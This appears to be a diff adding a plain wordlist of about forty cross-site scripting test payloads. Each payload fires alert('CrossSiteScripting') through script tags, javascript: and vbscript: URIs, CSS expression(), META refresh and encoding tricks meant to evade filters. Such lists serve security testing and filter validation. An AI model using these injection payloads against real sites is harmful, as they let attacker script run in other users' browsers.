@@ -1,0 +1,43 @@
+<script>alert('CrossSiteScripting')</script>
+<SCRIPT>alert('CrossSiteScripting')</SCRIPT>
+<BASE HREF="javascript:alert('CrossSiteScripting');//">
+<BGSOUND SRC="javascript:alert('CrossSiteScripting');">
+<BODY BACKGROUND="javascript:alert('CrossSiteScripting');">
+<BODY ONLOAD=alert('CrossSiteScripting')>
+<DIV STYLE="background-image: url(javascript:alert('CrossSiteScripting'))">
+<DIV STYLE="background-image: url(&amp;#1;javascript:alert('CrossSiteScripting'))">
+<DIV STYLE="width: expression(alert('CrossSiteScripting'));">
+<FRAMESET><FRAME SRC="javascript:alert('CrossSiteScripting');"></FRAMESET>
+<IFRAME SRC="javascript:alert('CrossSiteScripting');"></IFRAME>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('CrossSiteScripting');">
+<IMG SRC="javascript:alert('CrossSiteScripting');">
+<IMG SRC=javascript:alert('CrossSiteScripting')>
+<IMG DYNSRC="javascript:alert('CrossSiteScripting');">
+<IMG LOWSRC="javascript:alert('CrossSiteScripting');">
+exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("CrossSiteScripting"))'>
+<IMG SRC='vbscript:msgbox("CrossSiteScripting")'>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScripting');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('CrossSiteScripting');">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('CrossSiteScripting'))">
+<XSS STYLE="xss:expression(alert('CrossSiteScripting'))">
+<STYLE>.XSS{background-image:url("javascript:alert('CrossSiteScripting')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('CrossSiteScripting')")}</STYLE>
+<LINK REL="stylesheet" HREF="javascript:alert('CrossSiteScripting');">
+<TABLE BACKGROUND="javascript:alert('CrossSiteScripting')"></TABLE>
+<TABLE><TD BACKGROUND="javascript:alert('CrossSiteScripting')"></TD></TABLE>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('CrossSiteScripting')</SCRIPT>">
+<BR SIZE="&amp;{alert('CrossSiteScripting')}">
+<IMG SRC=JaVaScRiPt:alert('CrossSiteScripting')>
+<IMG SRC=javascript:alert(&amp;quot;CrossSiteScripting&amp;quot;)>
+<IMG SRC=`javascript:alert("CrossSiteScripting")`>
+</TITLE><SCRIPT>alert("CrossSiteScripting");</SCRIPT>
+<STYLE>@im\port'\ja\vasc\ript:alert("CrossSiteScripting")';</STYLE>
+<IMG SRC="javascript:alert('CrossSiteScripting');">
+<IMG SRC="jav&amp;#x09;ascript:alert('CrossSiteScripting');">
+<IMG SRC="jav&amp;#x0A;ascript:alert('CrossSiteScripting');">
+<IMG SRC="jav&amp;#x0D;ascript:alert('CrossSiteScripting');">
+<IMG SRC=" &amp;#14;javascript:alert('CrossSiteScripting');">
+<IMG SRC="javascript:alert('CrossSiteScripting')
+<SCRIPT>alert("CrossSiteScripting");//<</SCRIPT>
+<IMG """><SCRIPT>alert("CrossSiteScripting")</SCRIPT>">
+<SCRIPT>a=/CrossSiteScripting/alert(a.source)</SCRIPT>
